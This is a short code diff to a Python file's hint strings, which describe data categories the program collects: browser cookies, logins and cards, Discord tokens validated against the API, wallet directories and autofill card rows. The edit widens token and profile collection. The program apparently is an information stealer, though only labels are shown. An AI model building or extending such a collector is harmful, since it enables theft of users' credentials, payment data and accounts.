@@ -25,8 +25,8 @@ _LABELS: Final[dict[str, str]] = dict(SOURCE_LABELS)
 
 _HINTS: Final[dict[str, str]] = {
     "system": "UUID, CPU, GPU, memory, uptime, OS build, machine and user name.",
-    "browsers": "Profiles, cookies, logins, cards, history and downloads.",
-    "sessions": "Discord tokens from the LevelDB store, checked against the API.",
+    "browsers": "Profiles, cookies, logins, cards, history, downloads and the profile folder.",
+    "sessions": "Discord tokens from the browser store and the desktop client, checked against the API.",
     "wallets": "Wallet directories, names and sizes. No key material is read.",
     "autofill": "Address and card rows from the Chromium autofill tables.",
     "documents": "Recent-document lists from the user registry hives.",
